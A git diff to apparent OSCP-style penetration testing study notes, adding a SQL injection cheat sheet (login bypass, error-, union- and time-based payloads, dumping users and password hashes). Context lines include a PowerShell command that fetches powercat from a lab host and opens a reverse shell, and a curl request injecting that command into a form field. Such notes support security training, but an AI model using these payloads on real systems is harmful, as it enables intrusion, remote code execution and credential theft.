@@ -447,7 +447,25 @@
      - `IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell`: Command to download PowerCat and execute a reverse shell  
      - `curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive`  
 
-### 10. SQL injection attacks
+### 10. SQL injection attacks  
+- MySQL, Microsoft SQL Server, PostgreSQL, and Oracle
+- `mysql -u root -p'root' -h 192.168.50.16 -P 3306`: connect mysql
+- `select version();  select system_user();  show databases;  SELECT user, authentication_string FROM mysql.user WHERE user ='offsec';`. password hashing [Caching-SHA-256 algorithm]
+- `impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`: remove MSSQL via Kali Impacket  
+- `SELECT @@version;  SELECT name FROM sys.databases;  SELECT * FROM offsec.information_schema.tables;  select * from offsec.dbo.users`
+- SELECT * FROM users WHERE user_name= 'offsec  `' OR 1=1 --`: bypass login
+- Error-based
+  - error msg (invalid password) > single quote > payload `' OR 1=1 --//` > enumerate DB `' or 1=1 in (select @@version) -- //` > users `' OR 1=1 in (SELECT * FROM users) -- //`
+- Union-based
+  - 2 conditions: same number of columns ; data type for each column
+  - `' ORDER BY 1-- //`: discover the correct number of columns, increasing the column value by one each time
+  - `%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //`: which columns are displayed
+  - `%' UNION SELECT database(), user(), @@version, null, null -- //`: enumerating the DB
+  - `' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //`: table
+  - `' UNION SELECT null, username, password, description, null FROM users -- //`: column
+- Blind-based (boolean or time-based)
+  - `offsec' AND 1=1 -- //`: return true if record exist
+  - `offsec' AND IF (1=1, sleep(3),'false') -- //`: sleep 3 reconds if true
 ### 11. Phishing Basics
 ### 12. Client-site attacks
 ### 13. Locating public exploits
